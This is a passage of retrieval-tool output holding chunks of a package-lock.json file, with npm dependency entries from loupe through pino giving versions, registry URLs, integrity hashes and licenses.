\"sha512-lyuxPGr/Wfhrlem2CL/UcnUc1zcqKAImBDzukY7Y5F/yQiNdko6+fRLevlw1HgMySw7f611UIY408EtxRSoK3Q==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"js-tokens\": \"^3.0.0 || ^4.0.0\"\n      },\n      \"bin\": {\n        \"loose-envify\": \"cli.js\"\n      }\n    },\n    \"node_modules/loupe\": {\n      \"version\": \"2.3.7\",\n      \"resolved\": \"https://registry.npmjs.org/loupe/-/loupe-2.3.7.tgz\",\n      \"integrity\": \"sha512-zSMINGVYkdpYSOBmLi0D1Uo7JU9nVdQKrHxC8eYlV+9YKK9WePqAlL7lSlorG/U2Fw1w0hTBmaa/jrQ3UbPHtA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"get-func-name\": \"^2.0.1\"\n      }\n    },\n    \"node_modules/lru-cache\": {\n      \"version\": \"5.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/lru-cache/-/lru-cache-5.1.1.tgz\",\n      \"integrity\": \"sha512-KpNARQA3Iwv+jTA0utUVVbrh+Jlrr1Fv0e56GGzAFOXN7dk/FviaDW8LHmK52DlcH4WP2n6gI8vN1aesBFgo9w==\",\n      \"dev\": true,\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"yallist\": \"^3.0.2\"\n      }\n    },\n    \"node_modules/magic-string\": {\n      \"version\": \"0.30.21\",\n      \"resolved\": \"https://registry.npmjs.org/magic-string/-/magic-string-0.30.21.tgz\",\n      \"integrity\": \"sha512-vd2F4YUyEXKGcLHoq+TEyCjxueSeHnFxyyjNp80yg0XV4vUhnDer/lvvlqM/arB5bXQN5K2/3oinyCRyx8T2CQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@jridgewell/sourcemap-codec\": \"^1.5.5\"\n      }\n    },\n    \"node_modules/make-dir\": {\n      \"version\": \"3.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/make-dir/-/make-dir-3.1.0.tgz\",\n      \"integrity\": \"sha512-g3FeP20LNwhALb/6Cz6Dd4F2ngze0jz7tbzrD2wAV+o9FeNHe4rL+yK2md0J/fiSf1sa1ADhXqi5+oVwOM/eGw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"semver\": \"^6.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/math-intrinsics\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/math-intrinsics/-/math-intrinsics-1.1.0.tgz\",\n      \"integrity\": \"sha512-/IXtbwEk5HTPyEwyKX6hGkYXxM9nbj64B+ilVJnC/R6B0pH5G4V3b0pVbL7DBj4tkhBAppbQUlf6F6Xl9LHu1g==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/merge-stream\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/merge-stream/-/merge-stream-2.0.0.tgz\",\n      \"integrity\": \"sha512-abv/qOcuPfk3URPfDzmZU1LKmuw8kT+0nIHvKrKgFrwifol/doWcdA4ZqsWQ8ENrFKkd67Mfpo/LovbIUsbt3w==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/mime\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/mime/-/mime-3.0.0.tgz\",\n      \"integrity\": \"sha512-jSCU7/VB1loIWBZe14aEYHU/+1UMEHoaO7qxCOVJOw9GgH72VAWppxNcjU+x9a2k3GSIBXNKxXQFqRvvZ7vr3A==\",\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"mime\": \"cli.js\"\n      },\n      \"engines\": {\n        \"node\": \">=10.0.0\"\n      }\n    },\n    \"node_modules/mime-db\": {\n      \"version\": \"1.52.0\",\n      \"resolved\": \"https://registry.npmjs.org/mime-db/-/mime-db-1.52.0.tgz\",\n      \"integrity\": \"sha512-sPU4uV7dYlvtWJxwwxHD0PuihVNiE7TyAbQ5SWxDCB9mUYvOgroQOwYQQOKPJ8CIbE+1ETVlOoK1UC2nU3gYvg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.6\"\n      }\n    },\n    \"node_modules/mime-types\": {\n      \"version\": \"2.1.35\",\n      \"resolved\": \"https://registry.npmjs.org/mime-types/-/mime-types-2.1.35.tgz\",\n      \"integrity\": \"sha512-ZDY+bPm5zTTF+YpCrAU9nK0UgICYPT0QtT1NZWFv4s++TNkcgVaT0g6+4R2uI4MjQjzysHB1zxuWL50hzaeXiw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"mime-db\": \"1.52.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.6\"\n      }\n    },\n    \"node_modules/mimic-fn\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/mimic-fn/-/mimic-fn-4.0.0.tgz\",\n      \"integrity\": \"sha512-vqiC06CuhBTUdZH+RYl8sFrL096vA45Ok5ISO6sE/Mr1jRbGH4Csnhi8f3wKVl7x8mO4Au7Ir9D3Oyv1VYMFJw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/mimic-response\": {\n      \"version\": \"3.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/mimic-response/-/mimic-response-3.1.0.tgz\",\n      \"integrity\": \"sha512-z0yWI+4FDrrweS8Zmt4Ej5HdJmky15+L2e6Wgn3+iK5fWzb6T3fhNFq2+MeTRb064c6Wr4N/wv0DzQTjNzHNGQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {", "metadata": {"file": "package-lock.json", "start_line": 3601, "end_line": 3800, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:3801", "score": 0.0, "content": "        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/minimatch\": {\n      \"version\": \"9.0.5\",\n      \"resolved\": \"https://registry.npmjs.org/minimatch/-/minimatch-9.0.5.tgz\",\n      \"integrity\": \"sha512-G6T0ZX48xgozx7587koeX9Ys2NYy6Gmv//P89sEte9V9whIapMNF4idKxnW2QtCcLiTWlb/wfCabAtAFWhhBow==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"brace-expansion\": \"^2.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=16 || 14 >=14.17\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/minimist\": {\n      \"version\": \"1.2.8\",\n      \"resolved\": \"https://registry.npmjs.org/minimist/-/minimist-1.2.8.tgz\",\n      \"integrity\": \"sha512-2yyAR8qBkN3YuheJanUpWC5U3bb5osDywNB8RzDVlDwDHbocAJveqqj1u8+SVD7jkWT4yvsHCpWqqWqAxb0zCA==\",\n      \"license\": \"MIT\",\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"\n      }\n    },\n    \"node_modules/minipass\": {\n      \"version\": \"7.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/minipass/-/minipass-7.1.2.tgz\",\n      \"integrity\": \"sha512-qOOzS1cBTWYF4BH8fVePDBOO9iptMnGUEZwNc/cMWnTV2nVLZ7VoNWEPHkYczZA0pdoA7dl6e7FL659nX9S2aw==\",\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">=16 || 14 >=14.17\"\n      }\n    },\n    \"node_modules/minizlib\": {\n      \"version\": \"2.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/minizlib/-/minizlib-2.1.2.tgz\",\n      \"integrity\": \"sha512-bAxsR8BVfj60DWXHE3u30oHzfl4G7khkSuPW+qvpd7jFRHm7dLxOjUk1EHACJ/hxLY8phGJ0YhYHZo7jil7Qdg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"minipass\": \"^3.0.0\",\n        \"yallist\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 8\"\n      }\n    },\n    \"node_modules/minizlib/node_modules/minipass\": {\n      \"version\": \"3.3.6\",\n      \"resolved\": \"https://registry.npmjs.org/minipass/-/minipass-3.3.6.tgz\",\n      \"integrity\": \"sha512-DxiNidxSEK+tHG6zOIklvNOwm3hvCrbUrdtzY74U6HKTJxvIDfOUL5W5P2Ghd3DTkhhKPYGqeNUIh5qcM4YBfw==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"yallist\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/minizlib/node_modules/yallist\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz\",\n      \"integrity\": \"sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/mkdirp\": {\n      \"version\": \"1.0.4\",\n      \"resolved\": \"https://registry.npmjs.org/mkdirp/-/mkdirp-1.0.4.tgz\",\n      \"integrity\": \"sha512-vVqVZQyf3WLx2Shd0qJ9xuvqgAyKPLAiqITEtqW0oIUjzo3PePDd6fW9iFz30ef7Ysp/oiWqbhszeGWW2T6Gzw==\",\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"mkdirp\": \"bin/cmd.js\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/mkdirp-classic\": {\n      \"version\": \"0.5.3\",\n      \"resolved\": \"https://registry.npmjs.org/mkdirp-classic/-/mkdirp-classic-0.5.3.tgz\",\n      \"integrity\": \"sha512-gKLcREMhtuZRwRAfqP3RFW+TK4JqApVBtOIftVgjuABpAtpxhPGaDcfvbhNvD0B8iD1oUr/txX35NjcaY6Ns/A==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/mlly\": {\n      \"version\": \"1.8.0\",\n      \"resolved\": \"https://registry.npmjs.org/mlly/-/mlly-1.8.0.tgz\",\n      \"integrity\": \"sha512-l8D9ODSRWLe2KHJSifWGwBqpTZXIXTeo8mlKjY+E2HAakaTeNpqAyBZ8GSqLzHgw4XmHmC8whvpjJNMbFZN7/g==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"acorn\": \"^8.15.0\",\n        \"pathe\": \"^2.0.3\",\n        \"pkg-types\": \"^1.3.1\",\n        \"ufo\": \"^1.6.1\"\n      }\n    },\n    \"node_modules/mlly/node_modules/pathe\": {\n      \"version\": \"2.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/pathe/-/pathe-2.0.3.tgz\",\n      \"integrity\": \"sha512-WUjGcAqP1gQacoQe+OBJsFA7Ld4DyXuUIjZ5cc75cLHvJ7dtNsTugphxIADwspS+AraAUePCKrSVtPLFj/F88w==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/mnemonist\": {\n      \"version\": \"0.39.6\",\n      \"resolved\": \"https://registry.npmjs.org/mnemonist/-/mnemonist-0.39.6.tgz\",\n      \"integrity\": \"sha512-A/0v5Z59y63US00cRSLiloEIw3t5G+MiKz4BhX21FI+YBJXBOGW0ohFxTxO08dsOYlzxo87T7vGfZKYp2bcAWA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"obliterator\": \"^2.0.1\"\n      }\n    },\n    \"node_modules/ms\": {\n      \"version\": \"2.1.3\",\n      \"resolved\": \"https://registry.npmjs.org/ms/-/ms-2.1.3.tgz\",\n      \"integrity\": \"sha512-6FlzubTLZG3J2a/NVCAleEhjzq5oxgHyaCU9yYXvcLsvoVaHJq/s5xXI6/XXP6tz7R9xAOtHnSO/tXtF3WRTlA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/nanoid\": {\n      \"version\": \"5.1.6\",\n      \"resolved\": \"https://registry.npmjs.org/nanoid/-/nanoid-5.1.6.tgz\",\n      \"integrity\": \"sha512-c7+7RQ+dMB5dPwwCp4ee1/iV/q2P6aK1mTZcfr1BTuVlyW9hJYiMPybJCcnBlQtuSmTIWNeazm/zqNoZSSElBg==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/ai\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"nanoid\": \"bin/nanoid.js\"\n      },\n      \"engines\": {\n        \"node\": \"^18 || >=20\"\n      }\n    },\n    \"node_modules/napi-build-utils\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/napi-build-utils/-/napi-build-utils-2.0.0.tgz\",\n      \"integrity\": \"sha512-GEbrYkbfF7MoNaoh2iGG84Mnf/WZfB0GdGEsM8wz7Expx/LlWf5U8t9nvJKXSp3qr5IsEbK04cBGhol/KwOsWA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/node-abi\": {\n      \"version\": \"3.87.0\",\n      \"resolved\": \"https://registry.npmjs.org/node-abi/-/node-abi-3.87.0.tgz\",\n      \"integrity\": \"sha512-+CGM1L1CgmtheLcBuleyYOn7NWPVu0s0EJH2C4puxgEZb9h8QpR9G2dBfZJOAUhi7VQxuBPMd0hiISWcTyiYyQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"semver\": \"^7.3.5\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/node-abi/node_modules/semver\": {\n      \"version\": \"7.7.3\",\n      \"resolved\": \"https://registry.npmjs.org/semver/-/semver-7.7.3.tgz\",\n      \"integrity\": \"sha512-SdsKMrI9TdgjdweUSR9MweHA4EJ8YxHn8DFaDisvhVlUOe4BF1tLD7GAj0lIqWVl+dPb/rExr0Btby5loQm20Q==\",\n      \"license\": \"ISC\",\n      \"bin\": {\n        \"semver\": \"bin/semver.js\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/node-addon-api\": {\n      \"version\": \"7.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/node-addon-api/-/node-addon-api-7.1.1.tgz\",\n      \"integrity\": \"sha512-5m3bsyrjFWE1xf7nz7YXdN4udnVtXK6/Yfgn5qnahL6bCkf2yKt4k3nuTKAtT4r3IG8JNR2ncsIMdZuAzJjHQQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/node-domexception\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/node-domexception/-/node-domexception-1.0.0.tgz\",\n      \"integrity\": \"sha512-/jKZoMpw0F8GRwl4/eLROPA3cfcXtLApP0QzLmUT/HuPCZWyB7IY9ZrMeKw2O/nFIqPQB3PVM9aYm0F312AXDQ==\",\n      \"deprecated\": \"Use your platform's native DOMException instead\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/jimmywarting\"\n        },\n        {\n          \"type\": \"github\",\n          \"url\": \"https://paypal.me/jimmywarting\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10.5.0\"\n      }\n    },\n    \"node_modules/node-fetch\": {\n      \"version\": \"3.3.2\",\n      \"resolved\": \"https://registry.npmjs.org/node-fetch/-/node-fetch-3.3.2.tgz\",", "metadata": {"file": "package-lock.json", "start_line": 3801, "end_line": 4000, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:4001", "score": 0.0, "content": "      \"integrity\": \"sha512-dRB78srN/l6gqWulah9SrxeYnxeddIG30+GOqK/9OlLVyLg3HPnr6SqOWTWOXKRwC2eGYCkZ59NNuSgvSrpgOA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"data-uri-to-buffer\": \"^4.0.0\",\n        \"fetch-blob\": \"^3.1.4\",\n        \"formdata-polyfill\": \"^4.0.10\"\n      },\n      \"engines\": {\n        \"node\": \"^12.20.0 || ^14.13.1 || >=16.0.0\"\n      },\n      \"funding\": {\n        \"type\": \"opencollective\",\n        \"url\": \"https://opencollective.com/node-fetch\"\n      }\n    },\n    \"node_modules/node-releases\": {\n      \"version\": \"2.0.27\",\n      \"resolved\": \"https://registry.npmjs.org/node-releases/-/node-releases-2.0.27.tgz\",\n      \"integrity\": \"sha512-nmh3lCkYZ3grZvqcCH+fjmQ7X+H0OeZgP40OierEaAptX4XofMh5kwNbWh7lBduUzCcV/8kZ+NDLCwm2iorIlA==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/nopt\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/nopt/-/nopt-5.0.0.tgz\",\n      \"integrity\": \"sha512-Tbj67rffqceeLpcRXrT7vKAN8CwfPeIBgM7E6iBkmKLV7bEMwpGgYLGv0jACUsECaa/vuxP0IjEont6umdMgtQ==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"abbrev\": \"1\"\n      },\n      \"bin\": {\n        \"nopt\": \"bin/nopt.js\"\n      },\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/npm-run-path\": {\n      \"version\": \"5.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/npm-run-path/-/npm-run-path-5.3.0.tgz\",\n      \"integrity\": \"sha512-ppwTtiJZq0O/ai0z7yfudtBpWIoxM8yE6nHi1X47eFR2EWORqfbu6CnPlNsjeN683eT0qG6H/Pyf9fCcvjnnnQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"path-key\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \"^12.20.0 || ^14.13.1 || >=16.0.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/npm-run-path/node_modules/path-key\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/path-key/-/path-key-4.0.0.tgz\",\n      \"integrity\": \"sha512-haREypq7xkM7ErfgIyA0z+Bj4AGKlMSdlQE2jvJo6huWD1EdkKYV+G/T4nq0YEF2vgTT8kqMFKo1uHn950r4SQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/npmlog\": {\n      \"version\": \"5.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/npmlog/-/npmlog-5.0.1.tgz\",\n      \"integrity\": \"sha512-AqZtDUWOMKs1G/8lwylVjrdYgqA4d9nu8hc+0gzRxlDb1I10+FHBGMXs6aiQHFdCUUlqH99MUMuLfzWDNDtfxw==\",\n      \"deprecated\": \"This package is no longer supported.\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"are-we-there-yet\": \"^2.0.0\",\n        \"console-control-strings\": \"^1.1.0\",\n        \"gauge\": \"^3.0.0\",\n        \"set-blocking\": \"^2.0.0\"\n      }\n    },\n    \"node_modules/object-assign\": {\n      \"version\": \"4.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/object-assign/-/object-assign-4.1.1.tgz\",\n      \"integrity\": \"sha512-rJgTQnkUnH1sFw8yT6VSU3zD3sWmu6sZhIseY8VX+GRu3P6F7Fu+JNDoXfklElbLJSnc3FUQHVe4cU5hj+BcUg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/obliterator\": {\n      \"version\": \"2.0.5\",\n      \"resolved\": \"https://registry.npmjs.org/obliterator/-/obliterator-2.0.5.tgz\",\n      \"integrity\": \"sha512-42CPE9AhahZRsMNslczq0ctAEtqk8Eka26QofnqC346BZdHDySk3LWka23LI7ULIw11NmltpiLagIq8gBozxTw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/on-exit-leak-free\": {\n      \"version\": \"2.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/on-exit-leak-free/-/on-exit-leak-free-2.1.2.tgz\",\n      \"integrity\": \"sha512-0eJJY6hXLGf1udHwfNftBqH+g73EU4B504nZeKpz1sYRKafAghwxEJunB2O7rDZkL4PGfsMVnTXZ2EjibbqcsA==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      }\n    },\n    \"node_modules/once\": {\n      \"version\": \"1.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/once/-/once-1.4.0.tgz\",\n      \"integrity\": \"sha512-lNaJgI+2Q5URQBkccEKHTQOPaXdUxnZZElQTZY0MFUAuaEqe1E+Nyvgdz/aIyNi6Z9MzO5dv1H8n58/GELp3+w==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"wrappy\": \"1\"\n      }\n    },\n    \"node_modules/onetime\": {\n      \"version\": \"6.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/onetime/-/onetime-6.0.0.tgz\",\n      \"integrity\": \"sha512-1FlR+gjXK7X+AsAHso35MnyN5KqGwJRi/31ft6x0M194ht7S+rWAvd7PHss9xSKMzE0asv1pyIHaJYq+BbacAQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"mimic-fn\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/otplib\": {\n      \"version\": \"12.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/otplib/-/otplib-12.0.1.tgz\",\n      \"integrity\": \"sha512-xDGvUOQjop7RDgxTQ+o4pOol0/3xSZzawTiPKRrHnQWAy0WjhNs/5HdIDJCrqC4MBynmjXgULc6YfioaxZeFgg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@otplib/core\": \"^12.0.1\",\n        \"@otplib/preset-default\": \"^12.0.1\",\n        \"@otplib/preset-v11\": \"^12.0.1\"\n      }\n    },\n    \"node_modules/p-limit\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/p-limit/-/p-limit-5.0.0.tgz\",\n      \"integrity\": \"sha512-/Eaoq+QyLSiXQ4lyYV23f14mZRQcXnxfHrN0vCai+ak9G0pp9iEQukIIZq5NccEvwRB8PUnZT0KsOoDCINS1qQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"yocto-queue\": \"^1.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=18\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/package-json-from-dist\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/package-json-from-dist/-/package-json-from-dist-1.0.1.tgz\",\n      \"integrity\": \"sha512-UEZIS3/by4OC8vL3P2dTXRETpebLI2NiI5vIrjaD/5UtrkFX/tNbwjTSRAGC/+7CAo2pIcBaRgWmcBBHcsaCIw==\",\n      \"license\": \"BlueOak-1.0.0\"\n    },\n    \"node_modules/path-is-absolute\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/path-is-absolute/-/path-is-absolute-1.0.1.tgz\",\n      \"integrity\": \"sha512-AVbw3UJ2e9bq64vSaS9Am0fje1Pa8pbGqTTsmXfaIiMpnr5DlDhfJOuLj9Sf95ZPVDAUerDfEk88MPmPe7UCQg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/path-key\": {\n      \"version\": \"3.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/path-key/-/path-key-3.1.1.tgz\",\n      \"integrity\": \"sha512-ojmeN0qd+y0jszEtoY48r0Peq5dwMEkIlCOu6Q5f41lfkswXuKtYrhgoTpLnyIcHm24Uhqx+5Tqm2InSwLhE6Q==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/path-scurry\": {\n      \"version\": \"1.11.1\",\n      \"resolved\": \"https://registry.npmjs.org/path-scurry/-/path-scurry-1.11.1.tgz\",\n      \"integrity\": \"sha512-Xa4Nw17FS9ApQFJ9umLiJS4orGjm7ZzwUrwamcGQuHSzDyth9boKDaycYdDcZDuqYATXw4HFXgaqWTctW/v1HA==\",\n      \"license\": \"BlueOak-1.0.0\",\n      \"dependencies\": {\n        \"lru-cache\": \"^10.2.0\",\n        \"minipass\": \"^5.0.0 || ^6.0.2 || ^7.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=16 || 14 >=14.18\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/path-scurry/node_modules/lru-cache\": {\n      \"version\": \"10.4.3\",\n      \"resolved\": \"https://registry.npmjs.org/lru-cache/-/lru-cache-10.4.3.tgz\",\n      \"integrity\": \"sha512-JNAzZcXrCt42VGLuYz0zfAzDfAvJWW6AfYlDBQyDV5DClI2m5sAmK+OIO7s59XfsRsWHp02jAJrRadPRGTt6SQ==\",\n      \"license\": \"ISC\"", "metadata": {"file": "package-lock.json", "start_line": 4001, "end_line": 4200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:4201", "score": 0.0, "content": "    },\n    \"node_modules/pathe\": {\n      \"version\": \"1.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/pathe/-/pathe-1.1.2.tgz\",\n      \"integrity\": \"sha512-whLdWMYL2TwI08hn8/ZqAbrVemu0LNaNNJZX73O6qaIdCTfXutsLhMkjdENX0qhsQ9uIimo4/aQOmXkoon2nDQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/pathval\": {\n      \"version\": \"1.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/pathval/-/pathval-1.1.1.tgz\",\n      \"integrity\": \"sha512-Dp6zGqpTdETdR63lehJYPeIOqpiNBNtc7BpWSLrOje7UaIsE5aY92r/AunQA7rsXvet3lrJ3JnZX29UPTKXyKQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/picocolors\": {\n      \"version\": \"1.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/picocolors/-/picocolors-1.1.1.tgz\",\n      \"integrity\": \"sha512-xceH2snhtb5M9liqDsmEw56le376mTZkEX/jEb/RxNFyegNul7eNslCXP9FDj/Lcu0X8KEyMceP2ntpaHrDEVA==\",\n      \"dev\": true,\n      \"license\": \"ISC\"\n    },\n    \"node_modules/pino\": {\n      \"version\": \"8.21.0\",\n      \"resolved\": \"https://registry.npmjs.org/pino/-/pino-8.21.0.tgz\",\n      \"integrity\": \"sha512-ip4qdzjkAyDDZklUaZkcRFb2iA118H9SgRh8yzTkSQK8HilsOJF7rSY8HoW5+I0M46AZgX/pxbprf2vvzQCE0Q==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"atomic-sleep\": \"^1.0.0\",\n        \"fast-redact\": \"^3.1.1\",\n        \"on-exit-leak-free\": \"^2.1.0\",\n        \"pino-abstract-transport\": \"^1.2.0\",\n        \"pino-std-serializers\": \"^6.0.0\",\n        \"process-warning\": \"^3.0.0\",\n        \"quick-format-unescaped\": \"^4.0.3\",\n        \"real-require\": \"^0.2.0\",\n        \"safe-stable-stringify\": \"^2.3.1\",\n        \"sonic-boom\": \"^3.7.0\",\n        \"thread-stream\": \"^2.6.0\"\n      },\n      \"bin\": {\n        \"pino\": \"bin.js\"\n      }\n    },\n    \"node_modules/pino-abstract-transport\": {\n      \"version\": \"1.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/pino-abstract-transport/-/pino-abstract-transport-1.2.0.tgz\",\n      \"integrity\": \"sha512-Guhh8EZfPCfH+PMXAb6rKOjGQEoy0xlAIn+irODG5kgfYV+BQ0rGYYWTIel3P5mmyXqkYkPmdIkywsn6QKUR1Q==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"readable-stream\": \"^4.0.0\",\n        \"split2\": \"^4.0.0\"\n      }\n    },\n    \"node_modules/pino-abstract-transport/node_modules/buffer\": {\n      \"version\": \"6.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/buffer/-/buffer-6.0.3.tgz\",\n      \"integrity\": \"sha512-FTiCpNxtwiZZHEZbcbTIcZjERVICn9yq/pDFkTl95/AxzD1naBctN7YO68riM/gLSDY7sdrMby8hofADYuuqOA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"base64-js\": \"^1.3.1\",\n        \"ieee754\": \"^1.2.1\"\n      }\n    },\n    \"node_modules/pino-abstract-transport/node_modules/readable-stream\": {\n      \"version\": \"4.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/readable-stream/-/readable-stream-4.7.0.tgz\",\n      \"integrity\": 